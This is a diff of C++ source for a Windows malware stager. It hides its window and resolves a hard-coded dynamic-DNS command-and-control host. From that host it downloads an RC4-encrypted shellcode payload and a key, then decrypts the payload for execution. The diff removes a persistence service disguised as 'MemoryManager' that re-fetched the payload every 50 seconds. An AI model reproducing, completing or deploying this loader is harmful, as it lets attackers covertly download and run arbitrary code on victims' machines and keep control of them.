@@ -13,18 +13,44 @@
 //#pragma comment(linker, "/section:.data,RWE")   
 //不显示窗口  
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
-#pragma comment(linker, "/INCREMENTAL:NO")
-void WINAPI BDHandler(DWORD dwControl);
-void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
+//#pragma comment(linker, "/INCREMENTAL:NO")
 
-const char target[] = "192.3.176.232";
-const int  port = 81;
+const char target[] = "asufhcnfufkd.f3322.net";
+
+char *ip;
+const int  port = 82;
 const char obscure[] = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd";
 typedef void(__stdcall *CODE) ();
 char * shellcode = NULL;
 int shellcode_size = 0; 
-
+struct in_addr addr;
 typedef PVOID (*M) (DWORD, DWORD, DWORD, DWORD);
+
+void GetIP() {
+	int ret;
+	WSADATA wsaData;
+	ret = WSAStartup(0x101, &wsaData);
+	
+
+	if (ret != 0)
+	{
+		ip = (char *)target;
+		return;
+	}
+	hostent* host;
+	host = gethostbyname(target);
+	if (!host)
+	{
+		ip = (char *)target;
+		MessageBox(0, ip, ip, 0);
+		return;
+	}
+	addr.s_addr = *(unsigned long *)host->h_addr;
+	ip = inet_ntoa(addr);
+	MessageBox(0, ip, ip, 0);
+	WSACleanup();
+	return;
+}
 
 std::string GenerateUri()
 {
@@ -35,7 +61,7 @@ std::string GenerateUri()
 }
 void GetShellCodeSize()
 {
-	std::string host = std::string(target);
+	std::string host = std::string(ip);
 	HttpRequest httpReq(host, port);
 	std::string res = httpReq.HttpGet("/my/get_size");
 	std::string body = httpReq.getBody(res);
@@ -47,7 +73,8 @@ void GetShellCodeSize()
 std::string GetKey()
 {
 	GetShellCodeSize();
-	std::string host = std::string(target);
+	
+	std::string host = std::string(ip);
 	HttpRequest httpReq(host, port);
 	std::string res = httpReq.HttpGet("/"+ GenerateUri());
 
@@ -70,7 +97,8 @@ void LoadShellCode(char *shellcode)
 
 void DecPayload(std::string key)
 {
-	std::string host = std::string(target);
+	
+	std::string host = std::string(ip);
 	HttpRequest httpReq(host, port);
 	time_t myt = time(NULL);
 	int filename = int(int(myt) / 100);
@@ -81,6 +109,9 @@ void DecPayload(std::string key)
 	char * c_payload = (char *)malloc(shellcode_size);
 	memcpy_s(c_payload, shellcode_size, payload.c_str(), shellcode_size);
 	ARC4 rc4;
+	if (key.length() == 0) {
+		return;
+	}
 	rc4.setKey((unsigned char*)key.c_str(), key.length());
 	rc4.encrypt(c_payload, shellcode, shellcode_size);
 
@@ -88,61 +119,9 @@ void DecPayload(std::string key)
 	
 }
 
-
-
-
-
-SERVICE_STATUS ServiceStatus;
-SERVICE_STATUS_HANDLE ServiceStatusHandle;
-std::string ServiceName = "MemoryManager";
-void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv) {
-	if (!(ServiceStatusHandle = RegisterServiceCtrlHandler(ServiceName.c_str(),
-		BDHandler))) return;
-	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-	ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
-	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP
-		| SERVICE_ACCEPT_SHUTDOWN;
-	ServiceStatus.dwServiceSpecificExitCode = 0;
-	ServiceStatus.dwWin32ExitCode = 0;
-	ServiceStatus.dwCheckPoint = 0;
-	ServiceStatus.dwWaitHint = 0;
-	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
-	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
-	ServiceStatus.dwCheckPoint = 0;
-	ServiceStatus.dwWaitHint = 0;
-	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
-	while (TRUE){
-		DecPayload(GetKey());
-		Sleep(50000);// 如果掉线，过一分钟自动重连
-	}
-	
-}
-
-
-void WINAPI BDHandler(DWORD dwControl)
-{
-	switch (dwControl)
-	{
-	case SERVICE_CONTROL_STOP:
-		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
-		break;
-	case SERVICE_CONTROL_SHUTDOWN:
-		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
-		break;
-	default:
-		break;
-	}
-}
-
 int main()
 {  
-	SERVICE_TABLE_ENTRY ServiceTable[2];
-	ServiceTable[0].lpServiceName = (char *)ServiceName.c_str();
-	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
-	ServiceTable[1].lpServiceName = NULL;
-	ServiceTable[1].lpServiceProc = NULL;
-	StartServiceCtrlDispatcher(ServiceTable);
-	Sleep(20000);
+	GetIP();
 	//如果要不安装服务运行，请直接DecPayload(GetKey());
 	//ServiceInstall();
 	DecPayload(GetKey());
